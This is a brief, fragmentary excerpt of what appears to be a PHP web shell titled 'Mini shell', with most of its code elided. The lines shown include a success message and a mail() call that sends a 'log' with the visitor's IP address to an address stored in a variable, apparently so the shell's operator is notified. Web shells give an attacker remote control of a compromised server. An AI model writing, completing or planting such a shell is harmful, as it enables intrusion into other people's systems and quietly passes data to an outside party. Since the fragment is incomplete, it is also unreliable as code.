...
<BODY>
<H1><center>Mini shell</center></H1>
<center><button><a href="?"><font color="black">HOME</a></button></center>
...
echo '<font color="#cyan">success</font><br />';
}else{
...
mail($tujuanmail, "log", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
